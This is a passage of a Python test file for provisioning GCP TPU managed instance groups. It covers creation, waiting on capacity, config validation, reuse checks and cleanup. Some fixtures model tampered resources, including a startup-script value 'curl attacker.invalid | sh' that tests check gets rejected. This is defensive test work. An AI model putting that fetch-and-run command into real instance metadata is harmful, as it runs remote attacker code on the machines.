    compute.resourcePolicies.return_value.insert.return_value.execute.return_value = (
        workload_operation)
    compute.resourcePolicies.return_value.delete.return_value.execute.return_value = (
        delete_workload_operation)
    compute.regionInstanceGroupManagers.return_value.insert.return_value.execute.return_value = (
        mig_operation)
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)

    assert mig_utils.create_workload_policy(
        'project', 'us-east5', 'policy', '4x8',
        'AUTO_CONNECT') == workload_operation
    assert mig_utils.delete_workload_policy(
        'project', 'us-east5', 'policy') == delete_workload_operation
    assert mig_utils.create_region_managed_instance_group(
        'project',
        'us-east5',
        ['us-east5-a'],
        'mig',
        'projects/project/regions/us-east5/instanceTemplates/template',
        8,
        'projects/project/regions/us-east5/resourcePolicies/policy',
    ) == mig_operation

    compute.resourcePolicies.return_value.insert.assert_called_once_with(
        project='project',
        region='us-east5',
        requestId=ANY,
        body={
            'name': 'policy',
            'workloadPolicy': {
                'type': 'HIGH_THROUGHPUT',
                'acceleratorTopology': '4x8',
                'acceleratorTopologyMode': 'AUTO_CONNECT',
            },
        })
    compute.resourcePolicies.return_value.delete.assert_called_once_with(
        project='project', region='us-east5', resourcePolicy='policy')
    compute.regionOperations.return_value.wait.assert_not_called()
    compute.regionInstanceGroupManagers.return_value.insert.assert_called_once_with(
        project='project',
        region='us-east5',
        requestId=ANY,
        body={
            'name': 'mig',
            'instanceTemplate':
                ('projects/project/regions/us-east5/instanceTemplates/'
                 'template'),
            'targetSize': 8,
            'targetSizePolicy': {
                'mode': 'BULK',
            },
            'distributionPolicy': {
                'targetShape': 'ANY_SINGLE_ZONE',
                'zones': [{
                    'zone': 'projects/project/zones/us-east5-a',
                }],
            },
            'instanceLifecyclePolicy': {
                'defaultActionOnFailure': 'DO_NOTHING',
            },
            'resourcePolicies': {
                'workloadPolicy':
                    ('projects/project/regions/us-east5/resourcePolicies/'
                     'policy'),
            },
            'updatePolicy': {
                'type': 'OPPORTUNISTIC',
                'instanceRedistributionType': 'NONE',
            },
        })


def test_gcp_tpu_mig_compute_api_waits_through_capacity_error(monkeypatch):
    compute = MagicMock()
    sleep_calls = []
    execute = (compute.regionInstanceGroupManagers.return_value.get.
               return_value.execute)
    execute.side_effect = [{
        'targetSize': 2,
        'status': {
            'isStable': False,
            'bulkInstanceOperation': {
                'inProgress': True,
                'lastProgressCheck': {
                    'timestamp': '2026-07-22T01:00:00Z',
                    'error': {
                        'errors': [{
                            'code': 'ZONE_RESOURCE_POOL_EXHAUSTED_WITH_DETAILS',
                            'message': 'Waiting for resources.',
                        }],
                    },
                },
            },
            'currentInstanceStatuses': {
                'pending': 2,
                'running': 0,
            },
        },
    }, {
        'targetSize': 2,
        'status': {
            'isStable': True,
            'bulkInstanceOperation': {
                'inProgress': False,
            },
            'currentInstanceStatuses': {
                'pending': 0,
                'running': 2,
            },
        },
    }]
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)
    monkeypatch.setattr(mig_utils.time, 'sleep', sleep_calls.append)

    mig_utils.wait_for_region_managed_group_to_be_stable('project',
                                                         'us-east5',
                                                         'mig',
                                                         timeout=86400)

    assert execute.call_count == 2
    assert sleep_calls == [mig_utils._BULK_MIG_POLL_INTERVAL_SECONDS]


def test_gcp_tpu_mig_compute_api_wait_timeout(monkeypatch):
    compute = MagicMock()
    execute = (compute.regionInstanceGroupManagers.return_value.get.
               return_value.execute)
    execute.return_value = {
        'targetSize': 2,
        'status': {
            'isStable': False,
            'bulkInstanceOperation': {
                'inProgress': True,
                'lastProgressCheck': {
                    'error': {
                        'errors': [{
                            'code': 'QUOTA_EXCEEDED',
                            'message': 'Quota is insufficient.',
                        }],
                    },
                },
            },
            'currentInstanceStatuses': {
                'pending': 2,
            },
        },
    }
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)
    monotonic_values = iter([0.0, 0.0, 2.0, 2.0])
    monkeypatch.setattr(mig_utils.time, 'monotonic',
                        lambda: next(monotonic_values))

    with pytest.raises(TimeoutError, match='QUOTA_EXCEEDED'):
        mig_utils.wait_for_region_managed_group_to_be_stable('project',
                                                             'us-east5',
                                                             'mig',
                                                             timeout=1)


def test_gcp_tpu_mig_waits_for_running_status_after_stable(monkeypatch):
    compute = MagicMock()
    execute = (compute.regionInstanceGroupManagers.return_value.get.
               return_value.execute)
    execute.side_effect = [{
        'targetSize': 1,
        'status': {
            'isStable': True,
            'bulkInstanceOperation': {
                'inProgress': False,
            },
        },
    }, {
        'targetSize': 1,
        'status': {
            'isStable': True,
            'bulkInstanceOperation': {
                'inProgress': False,
            },
            'currentInstanceStatuses': {
                'running': 1,
            },
        },
    }]
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)
    monkeypatch.setattr(mig_utils.time, 'sleep', lambda _: None)

    mig_utils.wait_for_region_managed_group_to_be_stable('project',
                                                         'us-east5',
                                                         'mig',
                                                         timeout=60)

    assert execute.call_count == 2


@pytest.mark.parametrize(('machine_type', 'zone', 'topology', 'num_nodes'), [
    ('ct6e-standard-1t', 'us-east5-a', '1x1', 1),
    ('ct6e-standard-4t', 'us-east5-a', '2x2', 1),
    ('ct6e-standard-4t', 'us-east5-a', '4x8', 8),
    ('ct6e-standard-8t-tpu', 'us-east5-a', '2x4', 1),
    ('tpu7x-standard-4t', 'us-central1-c', '2x2x1', 1),
    ('tpu7x-standard-4t-tpu', 'us-central1-c', '2x4x4', 8),
])
def test_gcp_compute_tpu_flex_start_config_validates(machine_type, zone,
                                                     topology, num_nodes):
    mig_utils.validate_tpu_flex_start_config(machine_type, zone, topology,
                                             num_nodes)


@pytest.mark.parametrize(
    ('machine_type', 'zone', 'topology', 'num_nodes', 'error'), [
        ('ct6e-standard-4t', 'us-east5-b', '4x8', 8,
         'does not support TPU Flex-start'),
        ('ct6e-standard-4t', 'us-east5-a', '2x2x2', 2,
         'requires a 2D accelerator topology'),
        ('ct6e-standard-4t', 'us-east5-a', '2x4', 2,
         'not supported .* on Compute Engine'),
        ('ct6e-standard-4t', 'us-east5-a', '1x4', 1,
         'not supported .* on Compute Engine'),
        ('tpu7x-standard-4t', 'us-central1-c', '4x8', 8,
         'requires a 3D accelerator topology'),
        ('tpu7x-standard-4t', 'us-central1-c', '1x1x4', 1,
         'not supported .* on Compute Engine'),
        ('tpu7x-standard-4t', 'us-central1-c', '2x2x2', 1, 'requires 2 .* VMs'),
    ])
def test_gcp_compute_tpu_flex_start_config_rejects_mismatch(
        machine_type, zone, topology, num_nodes, error):
    with pytest.raises(ValueError, match=error):
        mig_utils.validate_tpu_flex_start_config(machine_type, zone, topology,
                                                 num_nodes)


def _matching_tpu_mig_resources():
    node_config = {
        gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
            'run_duration': 3600,
        },
        'machineType': 'ct6e-standard-4t',
        'labels': {
            'ray-cluster-name': 'cluster',
            'ray-node-type': 'worker',
            'skypilot-cluster-name': 'cluster',
            'skypilot-head-node': '0',
        },
    }
    instance_template = {
        'properties': mig_utils.make_region_instance_template_properties(
            'cluster', node_config),
    }
    workload_policy = {
        'workloadPolicy': {
            'type': 'HIGH_THROUGHPUT',
            'acceleratorTopology': '4x4',
            'acceleratorTopologyMode': 'AUTO_CONNECT',
        },
    }
    managed_instance_group = {
        'targetSize': 4,
        'targetSizePolicy': {
            'mode': 'BULK',
        },
        'distributionPolicy': {
            'targetShape': 'ANY_SINGLE_ZONE',
            'zones': [{
                'zone': 'projects/project/zones/us-east5-a',
            }],
        },
        'instanceTemplate':
            ('https://www.googleapis.com/compute/v1/projects/project/regions/'
             'us-east5/instanceTemplates/sky-it-cluster'),
        'resourcePolicies': {
            'workloadPolicy':
                ('https://www.googleapis.com/compute/v1/projects/project/'
                 'regions/us-east5/resourcePolicies/sky-wp-cluster'),
        },
        'updatePolicy': {
            'type': 'OPPORTUNISTIC',
            'instanceRedistributionType': 'NONE',
        },
        'instanceLifecyclePolicy': {
            'defaultActionOnFailure': 'DO_NOTHING',
        },
        'status': {
            'versionTarget': {
                'isReached': True,
            },
            'allInstancesConfig': {
                'effective': True,
            },
            'stateful': {
                'hasStatefulConfig': False,
                'perInstanceConfigs': {
                    'allEffective': True,
                },
            },
        },
    }
    return instance_template, workload_policy, managed_instance_group


def _matching_tpu_mig_members(instance_names):
    instance_template = (
        'https://www.googleapis.com/compute/v1/projects/project/regions/'
        'us-east5/instanceTemplates/sky-it-cluster')
    return [{
        'instance': f'projects/project/zones/us-east5-a/instances/{instance_name}',
        'version': {
            'instanceTemplate': instance_template,
        },
    } for instance_name in instance_names]


def test_gcp_tpu_mig_reuse_accepts_zero_size_group_without_members():
    instance_template, workload_policy, managed_instance_group = (
        _matching_tpu_mig_resources())
    managed_instance_group['targetSize'] = 0
    managed_instance_group['status'] = {}

    mismatches = mig_utils.get_tpu_mig_reuse_mismatches(
        project_id='project',
        region='us-east5',
        zone='us-east5-a',
        total_count=0,
        machine_type='ct6e-standard-4t',
        run_duration=3600,
        accelerator_topology='4x4',
        accelerator_topology_mode='AUTO_CONNECT',
        instance_template_name='sky-it-cluster',
        workload_policy_name='sky-wp-cluster',
        expected_instance_properties=instance_template['properties'],
        instance_template=instance_template,
        workload_policy=workload_policy,
        managed_instance_group=managed_instance_group,
        managed_instances=[],
    )

    assert mismatches == []


@pytest.mark.parametrize(('status_path', 'expected_mismatch'), [
    (('versionTarget', 'isReached'), 'target version is not fully applied'),
    (('allInstancesConfig', 'effective'),
     'all-instances configuration is not fully applied'),
    (('stateful', 'perInstanceConfigs', 'allEffective'),
     'per-instance configurations are not fully applied'),
])
@pytest.mark.parametrize(
    'status_value',
    [
        pytest.param(False, id='false'),
        pytest.param(None, id='null'),
        pytest.param(1, id='truthy-non-bool'),
        pytest.param('__missing__', id='missing'),
    ],
)
def test_gcp_tpu_mig_reuse_requires_exact_convergence_status(
        status_path, expected_mismatch, status_value):
    instance_template, workload_policy, managed_instance_group = (
        _matching_tpu_mig_resources())
    status_owner = managed_instance_group['status']
    for status_key in status_path[:-1]:
        status_owner = status_owner[status_key]
    if status_value == '__missing__':
        status_owner.pop(status_path[-1])
    else:
        status_owner[status_path[-1]] = status_value

    mismatches = mig_utils.get_tpu_mig_reuse_mismatches(
        project_id='project',
        region='us-east5',
        zone='us-east5-a',
        total_count=4,
        machine_type='ct6e-standard-4t',
        run_duration=3600,
        accelerator_topology='4x4',
        accelerator_topology_mode='AUTO_CONNECT',
        instance_template_name='sky-it-cluster',
        workload_policy_name='sky-wp-cluster',
        expected_instance_properties=instance_template['properties'],
        instance_template=instance_template,
        workload_policy=workload_policy,
        managed_instance_group=managed_instance_group,
        managed_instances=_matching_tpu_mig_members(
            ['node-0', 'node-1', 'node-2', 'node-3']),
    )

    assert any(expected_mismatch in mismatch for mismatch in mismatches)


def test_gcp_ct6e_mig_uses_regional_bulk_workload_policy(monkeypatch):
    calls = []
    monkeypatch.setattr(mig_utils, 'get_missing_tpu_flex_start_permissions',
                        lambda project_id: [])

    def add_labels_and_find_head(cls, *args, **kwargs):
        del cls
        calls.append(('add-labels', args, kwargs))
        return ['node-0', 'node-1', 'node-2', 'node-3']

    monkeypatch.setattr(mig_utils, 'get_region_instance_template',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(mig_utils, 'get_region_managed_instance_group',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(
        mig_utils, 'check_managed_instance_group_exists',
        lambda *args, **kwargs:
        (_ for _ in
         ()).throw(AssertionError('TPU MIG should not use zonal MIG lookup')))
    monkeypatch.setattr(mig_utils, 'get_workload_policy',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(
        mig_utils, 'create_region_instance_template',
        lambda *args, **kwargs: calls.append(
            ('template', args, kwargs)) or {'name': 'template-op'})
    monkeypatch.setattr(
        mig_utils, 'create_workload_policy',
        lambda *args, **kwargs: calls.append(('workload-policy', args, kwargs)))
    monkeypatch.setattr(
        mig_utils, 'create_region_managed_instance_group',
        lambda *args, **kwargs: calls.append(('regional-mig', args, kwargs)))
    monkeypatch.setattr(
        mig_utils, 'wait_for_region_managed_group_to_be_stable',
        lambda *args, **kwargs: calls.append(
            ('wait-regional-mig', args, kwargs)))
    monkeypatch.setattr(
        mig_utils, 'list_managed_instance_group_instances',
        lambda *args, **kwargs: ['node-0', 'node-1', 'node-2', 'node-3'])
    monkeypatch.setattr(
        mig_utils, 'create_managed_instance_group', lambda *args, **kwargs:
        (_ for _ in
         ()).throw(AssertionError('TPU MIG should not use zonal MIG creation')))
    monkeypatch.setattr(
        mig_utils, 'resize_managed_instance_group', lambda *args, **kwargs:
        (_ for _ in
         ()).throw(AssertionError('TPU MIG should not use resize requests')))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'wait_for_operation',
        classmethod(lambda cls, *args, **kwargs: calls.append(
            ('wait-operation', args, kwargs))))
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        '_add_labels_and_find_head',
                        classmethod(add_labels_and_find_head))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'create_node_tag',
        classmethod(lambda cls, *args, **kwargs: calls.append(
            ('head-tag', args, kwargs))))

    _, instance_names = instance_utils.GCPManagedInstanceGroup.create_instances(
        cluster_name='cluster',
        project_id='project',
        zone='us-east5-a',
        node_config={
            gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
                'run_duration': 3600,
                'provision_timeout': 900,
                'accelerator_topology': '4x4',
                'accelerator_topology_mode': 'AUTO_CONNECT',
            },
            'machineType': 'ct6e-standard-4t',
            'labels': {
                'ray-cluster-name': 'stale-cluster',
                'skypilot-cluster-name': 'stale-cluster',
            },
        },
        labels={},
        count=4,
        total_count=4,
        include_head_node=True,
    )

    assert instance_names == ['node-0', 'node-1', 'node-2', 'node-3']
    assert [call[0] for call in calls] == [
        'template',
        'wait-operation',
        'workload-policy',
        'wait-operation',
        'regional-mig',
        'wait-operation',
        'wait-regional-mig',
        'add-labels',
        'head-tag',
    ]
    regional_mig_call = calls[4]
    assert regional_mig_call[2] == {
        'size': 4,
        'workload_policy_url':
            'projects/project/regions/us-east5/resourcePolicies/'
            'sky-wp-cluster',
    }
    assert regional_mig_call[1][:5] == (
        'project',
        'us-east5',
        ['us-east5-a'],
        'sky-mig-cluster',
        'projects/project/regions/us-east5/instanceTemplates/sky-it-cluster',
    )
    relabel_call = calls[-2]
    assert relabel_call[1][3] == {
        'ray-cluster-name': 'cluster',
        'ray-node-type': 'worker',
        'skypilot-cluster-name': 'cluster',
        'skypilot-head-node': '0',
    }


def test_gcp_tpu_mig_resumes_partially_materialized_group(monkeypatch):
    partial_members = ['node-0', 'node-1']
    complete_members = ['node-0', 'node-1', 'node-2', 'node-3']
    monkeypatch.setattr(mig_utils, 'get_missing_tpu_flex_start_permissions',
                        lambda project_id: [])
    instance_template, workload_policy, managed_instance_group = (
        _matching_tpu_mig_resources())
    instance_template['properties']['machineType'] = (
        'https://www.googleapis.com/compute/v1/projects/project/zones/'
        'us-east5-a/machineTypes/ct6e-standard-4t')
    # Compute may return safe defaults that were omitted from the request.
    instance_template['properties']['canIpForward'] = False
    monkeypatch.setattr(mig_utils, 'get_region_instance_template',
                        lambda *args, **kwargs: instance_template)
    monkeypatch.setattr(mig_utils, 'get_region_managed_instance_group',
                        lambda *args, **kwargs: managed_instance_group)
    monkeypatch.setattr(mig_utils, 'get_workload_policy',
                        lambda *args, **kwargs: workload_policy)
    monkeypatch.setattr(
        mig_utils, '_list_managed_instance_group_members',
        lambda *args, **kwargs: _matching_tpu_mig_members(partial_members))
    list_members = MagicMock(side_effect=[partial_members, complete_members])
    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        list_members)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        classmethod(lambda cls, *args, **kwargs: {}))
    wait_for_stable = MagicMock()
    monkeypatch.setattr(mig_utils, 'wait_for_region_managed_group_to_be_stable',
                        wait_for_stable)
    create_template = MagicMock()
    create_policy = MagicMock()
    create_mig = MagicMock()
    monkeypatch.setattr(mig_utils, 'create_region_instance_template',
                        create_template)
    monkeypatch.setattr(mig_utils, 'create_workload_policy', create_policy)
    monkeypatch.setattr(mig_utils, 'create_region_managed_instance_group',
                        create_mig)
    cleanup = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'delete_tpu_mig_resources', cleanup)
    add_labels = MagicMock(return_value=complete_members)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        '_add_labels_and_find_head', add_labels)
    create_node_tag = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'create_node_tag', create_node_tag)

    _, instance_names = instance_utils.GCPManagedInstanceGroup.create_instances(
        cluster_name='cluster',
        project_id='project',
        zone='us-east5-a',
        node_config={
            gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
                'run_duration': 3600,
                'provision_timeout': 900,
                'accelerator_topology': '4x4',
                'accelerator_topology_mode': 'AUTO_CONNECT',
            },
            'machineType': 'ct6e-standard-4t',
            'labels': {},
        },
        labels={},
        # _run_instances passes only the number of targets not materialized
        # yet, even though the existing regional MIG already targets the full
        # topology.
        count=2,
        total_count=4,
        include_head_node=False,
    )

    assert instance_names == complete_members
    assert list_members.call_count == 2
    wait_for_stable.assert_called_once_with('project',
                                            'us-east5',
                                            'sky-mig-cluster',
                                            timeout=900)
    create_template.assert_not_called()
    create_policy.assert_not_called()
    create_mig.assert_not_called()
    cleanup.assert_not_called()
    add_labels.assert_called_once_with(
        'cluster', 'project', 'us-east5-a', {
            'ray-cluster-name': 'cluster',
            'ray-node-type': 'worker',
            'skypilot-cluster-name': 'cluster',
            'skypilot-head-node': '0',
        }, [], complete_members)
    create_node_tag.assert_called_once_with('project',
                                            'us-east5-a',
                                            'node-0',
                                            is_head=True)


@pytest.mark.parametrize('mismatch', [
    'target_size',
    'workload_topology',
    'template_config',
    'threads_per_core',
    'boot_image',
    'network',
    'service_account',
    'all_instances_config',
    'stateful_policy',
    'stateful_status',
    'version_target_status',
    'all_instances_config_status',
    'per_instance_config_status',
    'member_template',
    'member_preserved_state',
])
def test_gcp_tpu_mig_recreates_incompatible_resources(monkeypatch, mismatch):
    instance_template, workload_policy, managed_instance_group = (
        _matching_tpu_mig_resources())
    monkeypatch.setattr(mig_utils, 'get_missing_tpu_flex_start_permissions',
                        lambda project_id: [])
    machine_type = 'ct6e-standard-4t'
    accelerator_topology = '4x4'
    total_count = 4
    count = 2
    instance_names = ['node-0', 'node-1', 'node-2', 'node-3']
    managed_instances = []
    node_config_extra = {}
    if mismatch == 'target_size':
        managed_instance_group['targetSize'] = 8
    elif mismatch == 'workload_topology':
        workload_policy['workloadPolicy']['acceleratorTopology'] = '4x8'
    elif mismatch == 'template_config':
        instance_template['properties']['scheduling']['maxRunDuration'] = {
            'seconds': '7200',
        }
    elif mismatch == 'threads_per_core':
        machine_type = 'ct6e-standard-8t'
        accelerator_topology = '2x4'
        total_count = 1
        count = 1
        instance_names = ['node-0']
        instance_template['properties']['machineType'] = machine_type
        workload_policy['workloadPolicy'][
            'acceleratorTopology'] = accelerator_topology
        managed_instance_group['targetSize'] = total_count
        node_config_extra['advancedMachineFeatures'] = {
            'threadsPerCore': 1,
        }
    elif mismatch == 'boot_image':
        node_config_extra['disks'] = [{
            'boot': True,
            'autoDelete': True,
            'initializeParams': {
                'sourceImage': 'projects/project/global/images/intended',
                'diskType': 'hyperdisk-balanced',
                'diskSizeGb': 50,
            },
        }]
        instance_template['properties']['disks'] = [{
            'boot': True,
            'autoDelete': True,
            'initializeParams': {
                'sourceImage': 'projects/attacker/global/images/untrusted',
                'diskType': 'hyperdisk-balanced',
                'diskSizeGb': 50,
            },
        }]
    elif mismatch == 'network':
        node_config_extra['networkInterfaces'] = [{
            'subnetwork': 'projects/project/regions/us-east5/subnetworks/safe',
        }]
        instance_template['properties']['networkInterfaces'] = [{
            'subnetwork': 'projects/attacker/regions/us-east5/subnetworks/untrusted',
        }]
    elif mismatch == 'service_account':
        node_config_extra['serviceAccounts'] = [{
            'email': 'intended@project.iam.gserviceaccount.com',
            'scopes': ['https://www.googleapis.com/auth/cloud-platform'],
        }]
        instance_template['properties']['serviceAccounts'] = [{
            'email': 'untrusted@project.iam.gserviceaccount.com',
            'scopes': ['https://www.googleapis.com/auth/cloud-platform'],
        }]
    elif mismatch == 'all_instances_config':
        managed_instance_group['allInstancesConfig'] = {
            'properties': {
                'metadata': {
                    'startup-script': 'curl attacker.invalid | sh',
                },
            },
        }
    elif mismatch == 'stateful_policy':
        managed_instance_group['statefulPolicy'] = {
            'preservedState': {
                'disks': {
                    'data': {
                        'autoDelete': 'NEVER',
                    },
                },
            },
        }
    elif mismatch == 'stateful_status':
        managed_instance_group['status'] = {
            'stateful': {
                'hasStatefulConfig': True,
            },
        }
    elif mismatch == 'version_target_status':
        managed_instance_group['status']['versionTarget']['isReached'] = False
    elif mismatch == 'all_instances_config_status':
        managed_instance_group['status']['allInstancesConfig'][
            'effective'] = False
    elif mismatch == 'per_instance_config_status':
        managed_instance_group['status']['stateful']['perInstanceConfigs'][
            'allEffective'] = False
    elif mismatch == 'member_template':
        managed_instances = _matching_tpu_mig_members(['node-0'])
        managed_instances[0]['version']['instanceTemplate'] = (
            'projects/attacker/regions/us-east5/instanceTemplates/untrusted')
    else:
        assert mismatch == 'member_preserved_state'
        managed_instances = _matching_tpu_mig_members(['node-0'])
        managed_instances[0]['preservedStateFromConfig'] = {
            'metadata': {
                'startup-script': 'curl attacker.invalid | sh',
            },
        }

    monkeypatch.setattr(mig_utils, 'get_region_instance_template',
                        lambda *args, **kwargs: instance_template)
    monkeypatch.setattr(mig_utils, 'get_region_managed_instance_group',
                        lambda *args, **kwargs: managed_instance_group)
    monkeypatch.setattr(mig_utils, 'get_workload_policy',
                        lambda *args, **kwargs: workload_policy)
    monkeypatch.setattr(mig_utils, '_list_managed_instance_group_members',
                        lambda *args, **kwargs: managed_instances)
    cleanup = MagicMock(return_value=True)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'delete_tpu_mig_resources', cleanup)
    create_template = MagicMock(return_value={'name': 'template-op'})
    create_policy = MagicMock(return_value={'name': 'policy-op'})
    create_mig = MagicMock(return_value={'name': 'mig-op'})
    monkeypatch.setattr(mig_utils, 'create_region_instance_template',
                        create_template)
    monkeypatch.setattr(mig_utils, 'create_workload_policy', create_policy)
    monkeypatch.setattr(mig_utils, 'create_region_managed_instance_group',
                        create_mig)
    wait_for_operation = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'wait_for_operation', wait_for_operation)
    wait_for_stable = MagicMock()
    monkeypatch.setattr(mig_utils, 'wait_for_region_managed_group_to_be_stable',
                        wait_for_stable)
    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        MagicMock(return_value=instance_names))
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        '_add_labels_and_find_head',
                        MagicMock(return_value=instance_names))
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'create_node_tag', MagicMock())

    node_config = {
        gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
            'run_duration': 3600,
            'provision_timeout': 900,
            'accelerator_topology': accelerator_topology,
            'accelerator_topology_mode': 'AUTO_CONNECT',
        },
        'machineType': machine_type,
        'labels': {},
        **node_config_extra,
    }
    _, created_instance_names = (
        instance_utils.GCPManagedInstanceGroup.create_instances(
            cluster_name='cluster',
            project_id='project',
            zone='us-east5-a',
            node_config=node_config,
            labels={},
            # The old MIG can make the caller observe a partial count. Once it
            # is rejected, the replacement must still request the full slice.
            count=count,
            total_count=total_count,
            include_head_node=False,
        ))

    assert created_instance_names == instance_names
    cleanup.assert_called_once_with('project', 'us-east5', 'cluster')
    create_template.assert_called_once()
    create_policy.assert_called_once()
    create_mig.assert_called_once()
    assert create_mig.call_args.kwargs['size'] == total_count
    assert wait_for_operation.call_count == 3
    wait_for_stable.assert_called_once_with('project',
                                            'us-east5',
                                            'sky-mig-cluster',
                                            timeout=900)


def test_gcp_tpu_mig_rejects_partial_count_for_new_group(monkeypatch):
    monkeypatch.setattr(mig_utils, 'get_missing_tpu_flex_start_permissions',
                        lambda project_id: [])
    monkeypatch.setattr(mig_utils, 'get_region_instance_template',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(mig_utils, 'get_region_managed_instance_group',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(mig_utils, 'get_workload_policy',
                        lambda *args, **kwargs: None)

    with pytest.raises(common.ProvisionerError,
                       match='requires creating the full accelerator topology'):
        instance_utils.GCPManagedInstanceGroup.create_instances(
            cluster_name='cluster',
            project_id='project',
            zone='us-east5-a',
            node_config={
                gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
                    'run_duration': 3600,
                    'provision_timeout': 900,
                    'accelerator_topology': '4x4',
                },
                'machineType': 'ct6e-standard-4t',
                'labels': {},
            },
            labels={},
            count=2,
            total_count=4,
            include_head_node=False,
        )


def test_gcp_ct6e_mig_cleans_up_created_resources_on_failure(monkeypatch):
    calls = []
    monkeypatch.setattr(mig_utils, 'get_missing_tpu_flex_start_permissions',
                        lambda project_id: [])
    monkeypatch.setattr(mig_utils, 'get_region_instance_template',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(mig_utils, 'get_region_managed_instance_group',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(
        mig_utils, 'check_managed_instance_group_exists',
        lambda *args, **kwargs:
        (_ for _ in
         ()).throw(AssertionError('TPU MIG should not use zonal MIG lookup')))
    monkeypatch.setattr(mig_utils, 'get_workload_policy',
                        lambda *args, **kwargs: None)
    monkeypatch.setattr(
        mig_utils, 'create_region_instance_template',
        lambda *args, **kwargs: calls.append(
            ('template', args, kwargs)) or {'name': 'template-op'})
    monkeypatch.setattr(
        mig_utils, 'create_workload_policy',
        lambda *args, **kwargs: calls.append(('workload-policy', args, kwargs)))
    monkeypatch.setattr(
        mig_utils, 'create_region_managed_instance_group',
        lambda *args, **kwargs: calls.append(('regional-mig', args, kwargs)))
    monkeypatch.setattr(
        mig_utils, 'wait_for_region_managed_group_to_be_stable',
        lambda *args, **kwargs:
        (_ for _ in ()).throw(RuntimeError('quota exhausted')))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'wait_for_operation',
        classmethod(lambda cls, *args, **kwargs: calls.append(
            ('wait-operation', args, kwargs))))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'delete_tpu_mig_resources',
        classmethod(lambda cls, *args, **kwargs: calls.append(
            ('cleanup', args, kwargs))))

    with pytest.raises(RuntimeError, match='quota exhausted'):
        instance_utils.GCPManagedInstanceGroup.create_instances(
            cluster_name='cluster',
            project_id='project',
            zone='us-south1-ai1b',
            node_config={
                gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
                    'run_duration': 3600,
                    'provision_timeout': 900,
                    'accelerator_topology': '4x4',
                    'accelerator_topology_mode': 'AUTO_CONNECT',
                },
                'machineType': 'ct6e-standard-4t',
                'labels': {},
            },
            labels={},
            count=4,
            total_count=4,
            include_head_node=True,
        )

    assert [call[0] for call in calls] == [
        'template',
        'wait-operation',
        'workload-policy',
        'wait-operation',
        'regional-mig',
        'wait-operation',
        'cleanup',
    ]
    assert calls[-1][1] == ('project', 'us-south1', 'cluster')


@pytest.mark.parametrize('mig_exists', [False, True])
def test_gcp_tpu_mig_cleanup_deletes_all_resources(monkeypatch, mig_exists):
    calls = []
    monkeypatch.setattr(
        mig_utils, 'check_region_managed_instance_group_exists',
        lambda *args, **kwargs: calls.append(('check-mig', args)) or mig_exists)
    monkeypatch.setattr(
        mig_utils, 'delete_region_managed_instance_group',
        lambda *args, **kwargs: calls.append(('delete-mig', args)) or {
            'name': 'delete-mig-op',
        })
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'wait_for_operation',
        classmethod(lambda cls, *args, **kwargs: calls.append(
            ('wait-operation', args, kwargs))))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup,
        '_delete_region_instance_template',
        classmethod(lambda cls, *args, **kwargs: calls.append(
            ('delete-template', args))))
    monkeypatch.setattr(
        mig_utils, 'delete_workload_policy',
        lambda *args, **kwargs: calls.append(('delete-policy', args)))

    deleted = instance_utils.GCPManagedInstanceGroup._delete_tpu_mig_resources(
        'project', 'us-east5', 'cluster')

    assert deleted is mig_exists
    expected_calls = [('check-mig', ('project', 'us-east5', 'sky-mig-cluster'))]
    if mig_exists:
        expected_calls.extend([
            ('delete-mig', ('project', 'us-east5', 'sky-mig-cluster')),
            ('wait-operation', ({
                'name': 'delete-mig-op',
            }, 'project'), {
                'region': 'us-east5',
            }),
        ])
    expected_calls.extend([
        ('delete-template', ('project', 'us-east5', 'sky-it-cluster')),
        ('delete-policy', ('project', 'us-east5', 'sky-wp-cluster')),
    ])
    assert calls == expected_calls


def test_gcp_tpu_mig_cleanup_waits_until_policy_delete_is_done(monkeypatch):
    monkeypatch.setattr(mig_utils, 'check_region_managed_instance_group_exists',
                        lambda *args, **kwargs: False)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        '_delete_region_instance_template',
                        classmethod(lambda cls, *args, **kwargs: None))
    delete_operation = {'name': 'delete-policy-op'}
    monkeypatch.setattr(mig_utils, 'delete_workload_policy',
                        lambda *args, **kwargs: delete_operation)
    compute = MagicMock()
    operation_wait = compute.regionOperations.return_value.wait
    operation_wait.return_value.execute.side_effect = [{
        'status': 'RUNNING',
    }, {
        'status': 'DONE',
    }]
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup,
